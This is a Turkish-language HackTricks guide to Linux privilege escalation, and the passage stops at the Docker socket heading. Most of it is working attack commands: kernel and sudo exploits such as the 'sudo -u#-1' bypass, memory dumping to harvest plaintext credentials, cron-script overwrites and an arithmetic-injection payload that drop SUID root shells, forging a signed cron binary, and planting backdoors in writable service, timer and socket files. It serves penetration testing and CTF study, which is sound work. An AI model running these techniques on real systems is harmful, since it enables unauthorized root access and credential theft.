# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan OS hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeninin içindeki herhangi bir klasörde yazma izniniz varsa** bazı libraries veya binaries'i hijack edebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Çekirdek sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını kontrol edin
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir zayıf kernel listesi ve bazı zaten **compiled exploits** şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer bazı **compiled exploits** bulabileceğiniz siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O web sitesinden tüm zayıf kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploitlerini aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (hedef üzerinde çalıştırın, sadece kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploitlerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen savunmasız sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün güvenlik açığına sahip olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo sürümleri 1.9.17p1'den önce (**1.9.14 - 1.9.17 < 1.9.17p1**) kullanıcı tarafından kontrol edilen bir dizinden `/etc/nsswitch.conf` dosyası kullanıldığında, sudo `--chroot` seçeneği aracılığıyla ayrıcalıksız yerel kullanıcıların ayrıcalıklarını root'a yükseltmesine izin verir.

O [vulnerability]'ı exploit etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) mevcut. Exploit'i çalıştırmadan önce, `sudo` sürümünüzün etkilenebilir olduğundan ve `chroot` özelliğini desteklediğinden emin olun.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) sayfasına bakın.

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu vuln'ün nasıl istismar edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleyin

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Diskler

Kontrol edin **hangi dosya sistemlerinin bağlandığını (mounted) veya bağlanmadığını (unmounted)**, nerede ve neden. Eğer bir şey bağlı değilse (unmounted), onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir compiler'ın yüklü olup olmadığını** kontrol edin. Bu, kernel exploit kullanmanız gerekirse faydalıdır; çünkü bunu kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Yüklü Güvenlik Açığı Olan Yazılımlar

Yüklü paketlerin ve servislerin **sürümlerini** kontrol edin. Örneğin, ayrıcalık yükseltmek için sömürülebilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Makineye SSH erişiminiz varsa, içinde yüklü olan güncel olmayan ve zafiyetli yazılımları kontrol etmek için **openVAS**'ı da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramaz çok fazla bilgi göstereceğini unutmayın; bu nedenle yüklü herhangi bir yazılım sürümünün bilinen exploits için zayıf olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamaların kullanılması önerilir_

## Süreçler

Hangi **süreçlerin** çalıştırıldığını gözden geçirin ve herhangi bir sürecin **olması gerekenden daha fazla ayrıcalığa sahip** olup olmadığını kontrol edin (belki bir tomcat root tarafından çalıştırılıyor?).
```bash
ps aux
ps -ef
top -n 1
```
Her zaman [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Ayrıca **process binaries** üzerindeki ayrıcalıklarınızı kontrol edin, belki birini üzerine yazabilirsiniz.

### Process monitoring

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık çalıştırılan veya belirli gereksinimler karşılandığında çalışan zayıf süreçleri tespit etmek için çok yararlı olabilir.

### Process memory

Bazı sunucu servisleri belleğin içinde açık metin halinde **kimlik bilgilerini** kaydeder.\
Normalde başka kullanıcılara ait süreçlerin belleğini okumak için **root ayrıcalıkları** gerekir; bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha yararlıdır.\
Ancak, unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makine varsayılan olarak **ptrace'e izin vermez**, bu da ayrıcalıksız kullanıcınıza ait diğer süreçleri dökümleyemeyeceğiniz anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. Bu, ptrace'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Eğer örneğin bir FTP servisine ait belleğe erişiminiz varsa, Heap'i elde edip içinde kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID'si için, **maps, o süreçte belleğin nasıl eşlendiğini gösterir**; bu, işlemin sanal adres alanını ifade eder; ayrıca **her eşlenmiş bölgenin izinlerini** de gösterir. Sanal **mem** dosyası **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların offset'lerini biliriz. Bu bilgiyi **mem dosyasında seek yapıp tüm okunabilir bölgeleri bir dosyaya dökmek** için kullanırız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. kernel'in sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubuna ait kullanıcılar tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Edinin: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir process belleğini dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve size ait olan process'i dump edebilirsiniz
- Script A.5 şu adresten [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

authenticator işleminin çalıştığını görürseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilirsiniz (önceki bölümlere bakarak bir process'in memory'sini dump etmenin farklı yollarını bulabilirsiniz) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekten ve bazı **iyi bilinen dosyalardan** **açık metin kimlik bilgilerini çalacaktır**. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | Süreç Adı            |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regex'leri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) root olarak çalışıyorsa – web tabanlı zamanlayıcı privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, yine de SSH local port-forwarding ile ona ulaşabilir ve ayrıcalıklı bir job oluşturarak yükseltebilirsiniz.

Tipik zincir
- Sadece loopback'e bağlı portu keşfet (örn., 127.0.0.1:8000) ve Basic-Auth realm'i `ss -ntlp` / `curl -v localhost:8000` ile tespit et
- Operasyonel artefaktlarda kimlik bilgilerini bul:
- Yedekler/scriptler içinde `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- high-priv job oluşturun ve hemen çalıştırın (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
Kullan:
```bash
/tmp/rootshell -p   # root shell
```
Sertleştirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve en az izinlerle kısıtlayın
- localhost'a bind edin ve ek olarak erişimi firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- unit files içine gizli bilgileri gömmekten kaçının; secret stores veya sadece root erişimli EnvironmentFile kullanın
- isteğe bağlı job yürütmeleri için audit/logging'i etkinleştirin

Zamanlanmış herhangi bir job'ın zafiyete açık olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH şu şekilde bulunabilir: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Dikkat: "user" kullanıcısının /home/user üzerinde yazma yetkisi olduğunu unutmayın_)

Eğer bu crontab içinde root kullanıcısı PATH ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Böylece root shell elde etmek için şunu kullanabilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, wildcard içeren bir script kullanıyorsa (Wildcard Injection)

Eğer bir script root tarafından çalıştırılıyor ve bir komut içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için suistimal edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard şu şekilde bir yolun öncesinde yer alıyorsa** _**/some/path/\***_ **, zayıf değildir (hatta** _**./\***_ **de değildir).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Neden işe yarar: Bash'te expansions şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, sonra word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), sonra kalan sayısal `0` aritmetik için kullanılır ve script hata olmadan devam eder.

- Tipik zafiyet deseni:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- İstismar: Parse edilen log'a saldırgan kontrollü metin yazdırın, böylece sayısal görünen alan bir command substitution içerir ve bir rakamla biter. Komutunuz stdout'a yazmasın (veya yönlendirin) böylece aritmetik geçerli kalır.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer **root tarafından çalıştırılan bir cron script'ini değiştirebiliyorsanız**, çok kolay bir shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişiminiz olan bir directory** kullanıyorsa, o klasörü silmek ve sizin kontrolünüzdeki bir script'i sunan başka bir klasöre **symlink folder oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Yazılabilir payload'lara sahip özel imzalanmış cron binary'leri
Blue teams bazen cron ile tetiklenen binary'leri root olarak çalıştırmadan önce özel bir ELF bölümü döküp vendor string için grep yaparak "imzalar". Eğer o binary group-writable ise (ör. `/opt/AV/periodic-checks/monitor` `root:devs 770` sahibi) ve signing materyalini leak edebiliyorsanız, bölümü sahteleyip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. Era'da root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdı, ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` ve sonra dosyayı çalıştırdı.
2. Beklenen sertifikayı leaked key/config (from `signing.zip`) kullanarak yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir ikame oluşturun (ör., bir SUID bash bırakmak, SSH anahtarınızı eklemek) ve sertifikayı `.text_sig` içine gömün ki grep geçsin:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Çalıştırma izinlerini koruyarak zamanlanmış binary'nin üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; basit imza kontrolü başarılı olunca payload'ınız root olarak çalışır.

### Sık çalıştırılan cron işleri

Süreçleri, her 1, 2 veya 5 dakikada bir çalıştırılan işlemleri bulmak için izleyebilirsiniz. Belki bundan faydalanıp yetki yükseltebilirsiniz.

For example, to **her 0.1s'de 1 dakika boyunca izlemek**, **en az çalıştırılan komutlara göre sıralamak** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron görevleri

Bir yorumdan sonra **satırbaşı dönüşü (carriage return) koyarak** cronjob oluşturmak mümkündür (yeni satır karakteri olmadan) ve cron job çalışacaktır. Örnek (satırbaşı dönüşü karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamayacağınızı kontrol edin; yazabiliyorsanız, dosyayı **değiştirerek** servisin **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuzu **çalıştırmasını** sağlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekecektir).\
Örneğin backdoor'unuzu .service dosyasının içine **`ExecStart=/tmp/script.sh`** olarak koyun.

### Yazılabilir service binaries

Aklınızda bulundurun ki eğer servisler tarafından çalıştırılan ikili dosyalar üzerinde **yazma izinlerine** sahipseniz, bunları backdoors için değiştirebilirsiniz; böylece servisler yeniden çalıştırıldığında backdoors çalıştırılacaktır.

### systemd PATH - Relative Paths

**systemd** tarafından kullanılan PATH'ı şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **write** yapabildiğinizi fark ederseniz, **escalate privileges** gerçekleştirebilirsiniz. Servis yapılandırma dosyalarında şu şekilde **göreli yolların kullanılıp kullanılmadığını** aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ardından, yazma izniniz olan systemd PATH klasörünün içine, göreli yol ikili dosyasıyla aynı ada sahip bir **executable** oluşturun ve servisten zafiyetli eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor**'unuz çalıştırılacaktır (imtiyazsız kullanıcılar genellikle servisleri başlatıp/durduramazlar ancak `sudo -l` kullanıp kullanamadığınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service`.**

## **Timers**

**Timers** are systemd unit files whose name ends in `**.timer**` that control `**.service**` files or events. **Timers** can be used as an alternative to cron as they have built-in support for calendar time events and monotonic time events and can be run asynchronously.

Tüm timers'ları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timer'lar

Eğer bir timer'ı değiştirebiliyorsanız, systemd.unit içindeki bazı mevcut birimleri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> Bu timer sona erdiğinde etkinleştirilecek Unit. Argüman, son eki not ".timer" olan bir unit adıdır. Belirtilmezse, bu değer varsayılan olarak timer unit ile aynı ada sahip, sadece eki farklı olan bir service'e ayarlanır. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adının, sadece ekleri farklı olacak şekilde aynı adlandırılması önerilir.

Therefore, to abuse this permission you would need to:

- Bazı systemd unit'lerinden (ör. `.service`) **yazılabilir bir binary çalıştıran** bir tane bulun
- Bir systemd unit'i bulun ki o **relative bir yol çalıştırıyor** ve sizin **systemd PATH** üzerinde **yazma ayrıcalığınız** olsun (o executable'ı taklit etmek için)

**Timer'lar hakkında daha fazla bilgi için `man systemd.timer`'a bakın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Dikkat: **timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` yolunda ona bir symlink oluşturarak **etkinleştirilir**

## Sockets

Unix Domain Sockets (UDS), istemci-sunucu modelleri içinde aynı veya farklı makinelerde **işlem iletişimine** olanak sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla yapılandırılır.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**`man systemd.socket` ile sockets hakkında daha fazla bilgi edinin.** Bu dosya içinde, yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ama özetle **nerede dinleyeceğini belirtir** (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası, vb.)
- `Accept`: Boolean argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance oluşturulur** ve sadece bağlantı socket'i ona aktarılır. Eğer **false** ise, tüm dinleme socket'leri **başlatılan service unit'e aktarılır** ve tüm bağlantılar için sadece bir service unit oluşturulur. Bu değer, datagram soketleri ve FIFOs için yok sayılır; bu türlerde tek bir service unit gelen tüm trafiği koşulsuz olarak yönetir. **Varsayılan değeri false'tur.** Performans nedenleriyle, yeni daemon'ların `Accept=no` için uygun şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar dinlenen **socket'ler**/FIFO'lar **oluşturulup bind edilmeden önce** veya **sonra** sırasıyla **çalıştırılır**. Komut satırının ilk token'ı mutlak bir dosya adı olmalı, ardından process için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinlenen **socket'ler**/FIFO'lar **kapatılıp kaldırılmadan önce** veya **sonra** sırasıyla **çalıştırılan** ek **komutlar**.
- `Service`: Gelen trafik üzerinde **aktive edilecek** service unit adını belirtir. Bu ayar sadece Accept=no olan socket'ler için izinlidir. Varsayılan olarak socket ile aynı adı taşıyan (soneksti değiştirilmiş) service kullanılır. Çoğu durumda bu seçeneği kullanmak gerekli değildir.

### Yazılabilir .socket dosyaları

Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey **ekleyebilirsiniz** ve backdoor socket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Not: sistemin o socket dosyası konfigürasyonunu kullanması gerekir; aksi takdirde backdoor çalıştırılmaz_

### Yazılabilir sockets

Eğer herhangi bir **yazılabilir socket** tespit ederseniz (_burada artık config `.socket` dosyalarından değil, Unix Sockets'ten bahsediyoruz_), o socket ile **iletişim kurabilir** ve belki bir güvenlik açığından faydalanabilirsiniz.

### Unix Sockets'leri Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP soketleri

HTTP isteklerini dinleyen bazı **soketler** olabileceğini unutmayın (_burada .socket dosyalarından değil, unix soketleri olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket bir HTTP isteğine **yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **bazı güvenlik açıklarını istismar edebilirsiniz**.

### Yazılabilir Docker Socket

